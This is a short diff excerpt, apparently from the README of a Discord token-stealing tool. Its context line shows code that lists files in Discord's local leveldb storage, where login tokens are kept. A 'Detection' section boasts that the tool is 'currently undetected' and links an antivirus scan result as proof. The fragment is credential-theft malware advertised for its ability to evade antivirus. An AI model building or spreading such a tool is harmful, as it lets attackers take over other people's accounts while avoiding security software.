@@ -27,4 +27,5 @@ auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b
 
 # Detection
 Since it's fresh and not copied it is currently undetected
+
 ![Detection](https://antiscan.me/images/result/huIT9opQ9Off.png)
